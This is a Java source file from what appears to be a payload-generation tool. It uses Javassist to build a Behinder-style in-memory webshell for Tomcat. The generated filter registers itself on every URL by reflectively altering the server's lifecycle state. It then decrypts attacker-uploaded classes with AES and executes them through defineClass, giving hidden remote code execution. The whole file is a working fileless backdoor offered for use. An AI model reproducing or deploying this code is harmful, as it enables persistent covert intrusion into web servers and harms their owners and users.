package cn.safe6.payload.memshell;

import javassist.*;
import org.apache.coyote.RequestInfo;
import javax.servlet.jsp.PageContext;

import javax.servlet.Filter;

public class Behinder {


    /**
     * 此处用的是filter马，后面可以换成Listener马更香
     * Safe6 2021.8.2
     * @param pass
     * @return
     * @throws Exception
     */

    public static byte[] memBehinder3(String pass) throws Exception {
        //String pass = "rebeyond";

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(Filter.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
        classPool.insertClassPath(new ClassClassPath(Behinder.class));


        CtClass ctClass = classPool.makeClass("MemBehinder3");
        if (ctClass.getDeclaredConstructors().length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
        ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));


        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(javax.servlet.jsp.PageContext pageContext){\n" +
                "        this.pageContext = pageContext;\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public static String md5(String s) {\n" +
                "        String ret = null;\n" +
                "        try {\n" +
                "            java.security.MessageDigest m;\n" +
                "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
                "            m.update(s.getBytes(), 0, s.length());\n" +
                "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
                "        } catch (Exception e) {}\n" +
                "        return ret.substring(0,16).toLowerCase();\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {\n" +
                "\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletRequest;\n" +
                "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                "\n" +
                "        response.setHeader(\"inject\", \"ok\");\n" +
                "        if (request.getParameter(\"test\").equals(\"1\")) {\n" +
                "//            String k = \"e45e329feb5d925b\";\n" +
                "            String k = md5(passwd);\n" +
                "            session.putValue(\"u\", k);\n" +
                "            // 回显密钥\n" +
                "            try{\n" +
                "                pageContext.setRequest(servletRequest);\n" +
                "                pageContext.setResponse(servletResponse);\n" +
                "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec((session.getValue(\"u\") + \"\").getBytes(), \"AES\");\n" +
                "                c.init(2, sec);\n" +
                "                String upload = request.getReader().readLine();\n" +
                "                java.lang.reflect.Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                "                method.setAccessible(true);\n" +
                "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
                "//                Class evilclass = (Class) method.invoke(.class.getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                evilclass.newInstance().equals(pageContext);\n" +
                "            }catch (Exception e){\n" +
                "            }\n" +
                "        }\n" +
                "        filterChain.doFilter(request, response);\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void destroy() {\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public static void dynamicAddFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
                "        javax.servlet.ServletContext servletContext = request.getServletContext();\n" +
                "        if (servletContext.getFilterRegistration(name) == null) {\n" +
                "            java.lang.reflect.Field contextField = null;\n" +
                "            org.apache.catalina.core.ApplicationContext applicationContext = null;\n" +
                "            org.apache.catalina.core.StandardContext standardContext = null;\n" +
                "            java.lang.reflect.Field stateField = null;\n" +
                "            javax.servlet.FilterRegistration.Dynamic filterRegistration = null;\n" +
                "            try {\n" +
                "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);\n" +
                "                contextField = applicationContext.getClass().getDeclaredField(\"context\");\n" +
                "                contextField.setAccessible(true);\n" +
                "                standardContext = (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);\n" +
                "                stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField(\"state\");\n" +
                "                stateField.setAccessible(true);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);\n" +
                "                filterRegistration = servletContext.addFilter(name, filter);\n" +
                "                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{url});\n" +
                "                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\",null);\n" +
                "                filterStartMethod.setAccessible(true);\n" +
                "                filterStartMethod.invoke(standardContext, null);\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "            } catch (Exception e) {\n" +
                "\n" +
                "            } finally {\n" +
                "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "            }\n" +
                "        }\n" +
                "    }",ctClass));

        ctClass.addMethod(CtMethod.make("    public boolean equals(Object obj) {\n" +
                "        Object[] context = (Object[]) obj;\n" +
                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) context[0];\n" +
                "        org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) context[1];\n" +
                "        javax.servlet.http.HttpSession session = (javax.servlet.http.HttpSession) context[2];\n" +
                "        javax.servlet.jsp.PageContext page = (javax.servlet.jsp.PageContext) context[3];\n" +
                "        try {\n" +
                "            dynamicAddFilter(new MemBehinder3(page), \"Behinder\", \"/*\", request);\n" +
                "        } catch (IllegalAccessException e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "        return true;\n" +
                "    }", ctClass));
        return ctClass.toBytecode();
    }

}
